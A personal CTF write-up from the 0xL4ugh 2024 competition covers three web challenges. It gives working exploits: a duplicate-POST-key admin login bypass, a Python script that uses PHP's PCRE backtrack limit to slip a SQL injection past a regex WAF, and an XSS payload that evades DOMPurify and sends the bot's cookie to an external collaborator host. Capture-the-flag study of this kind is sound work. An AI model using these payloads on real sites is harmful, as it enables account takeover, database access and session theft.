title:  "0xL4ugh 2024"
---

Last weekend, I participated in the 0xL4ugh CTF as part of [ARESx](https://twitter.com/ARESxCTF). There were some infrastructure problems, but overall it was a fun CTF and we secured the 14th place.

Unfortunately there was only 1 pwn challenge so I tried myself at web challenges and managed to solve 3. This is a write up of them: [Micro](#micro-sec), [Simple WAF](#waf-sec) and [DamnPurify](#purify-sec).

The challenge files can be found in my [repo](https://github.com/Ollrogge/CtfWriteups).

<h2 id="micro-sec">Micro</h2>
Micro was a proxy kind of challenge were one had to login as admin into a Flask web page which had a php-based web page as proxy. The credentials for the admin account were given in the challenge description (admin:admin) so the goal was simply to login.

The problem of the challenge was that the php page denied all requests with `admin` as username:
```php
if(Check_Admin($username) && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admin Login allowed from localhost only : )");
}
else
{
    send_to_api(file_get_contents("php://input"));
}
```
The `REMOTE_ADDR` is taken from the IP socket so it cant be spoofed and the admin check was a simple regex which also looked safe.

### Bug
Proxy kind of challenges often have something todo with the proxy and the web page functioning differently which allows us to bypass the protective measures.

For this challenge, a clear hint is that the code uses `file_get_contents("php://input")`, which reads the complete request body instead of taking the username and password from the `$_POST` array, to forward the request to the backend server.

The vulnerability is that when sending the same key twice in a POST request body, php will return the value of the second key via `$_POST['username']` and flask will return the value of the first key via `request.form.get('username')`.

### Exploit
To exploit this we can simply send a post request that contains the key `username` twice, with the first value being `admin` and second value being anything but admin.

```python
URL ="http://20.115.83.90:1338/"

def login():
    data = [('username', 'admin'), ('password', 'admin'),('login-submit', '1'),('username','test')]

    r = requests.post(URL, data=data)

    print(r.content)

login()
```

<h2 id="waf-sec">Simple WAF</h2>
For Simple WAF one had to simply login as a valid user to get the flag. Since the only user in the database was admin, this again meant one had to login as admin.

```php
$username=$_POST['username'];
$password=md5($_POST['password']);
if(waf($username))
{
    die("WAF Block");
}
else
{
    $res = $conn->query("select * from users where username='$username' and password='$password'");

    if($res->num_rows ===1)
    {
        echo "0xL4ugh{Fake_Flag}";
    }
    else
    {
        echo "<script>alert('Wrong Creds')</script>";
    }
}
```
There is a pretty obvious SQL injection vulnerability for the `username` parameter since we fully control its contents and the code directly uses it in a SQL query. The problem however is that the username is protected by a `waf` function which limits us to only lowercase letters in the username:


```php
function waf($input)
{
    if(preg_match("/([^a-z])+/s",$input))
    {
        return true;
    }
    else
    {
        return false;
    }
}
```
This prevents us from doing any SQL injection since we cant modify the statement.

### Bug
The bug for this challenge is a pretty big footgun in my opinion as it is not even mentioned in the documentation of the `preg_match` function. Only in the user contributed notes people mention a potential problem.

The behavior of the `preg_match` function is affected by [runtime configurations](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.backtrack-limit) such as the `pcre.backtrack_limit`. This limit sets the maximum number of backtracking steps that the regex library is allowed to make while attempting to match a regular expression. The default backtracking limit is `1000000`. If the regex matching backtracks more than this limit, `preg_match` will return `false` without throwing any kind of error.

### Exploit
We can exploit this behavior by simply appending a very long matching string before our SQL injection to pass the `waf` check:
```python
URL="http://20.115.83.90:1339/"

def login():
    print("A"*0x100000+"' OR '1'='1' -- -")

    data = {
        'username': "A"*0x100000+"' OR '1'='1' -- -" ,
        'password': 'admin',
        'login-submit': '1'
    }

    r = requests.post(URL, data=data)

    print(r.content)

login()
```


<h2 id="purify-sec">DamnPurify</h2>

DamnPurify was a challenge that used the [DOMPurify](https://github.com/cure53/DOMPurify) XSS sanitizer to try and prevent XSS. A very simple web page was given which takes the value passed via the xss URL parameter, sanitizes it via DOMPurify and then uses a regex on it which replaces `style` blocks with an empty string.

The goal of the challenge was to achieve XSS despite the sanitization and steal the cookie of the bot.

```html
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <script src="https://cure53.de/purify.js"></script>
  </head>
  <body>
<script>
    window.onload = () => {
        const params = new URLSearchParams(location.search);
        injection = params.get("xss");
        if (injection)
        {
            injection = DOMPurify.sanitize(injection);

            document.body.innerHTML = injection.replace(/<style>.*<\/style>/gs, "");
        }
    };
</script>
</html>
```

As DOMPurify is used extensively in practice, finding a bug directly in the library was unlikely the goal of the challenge. Therefore it had to have something to do with the regex used.

### Exploit
Nothing special really I just tried a lot of things until something worked. Final payload:

```txt
http://20.115.83.90:1337/report.php?url=http://127.0.0.1/?xss=<img src="a <style>"><style>h1 {color: white</style> " onerror=fetch("http://zdg7rcb3lqhtsuix9r6uopbk0b62uuij.oastify.com/".concat(document.cookie))</p>
```
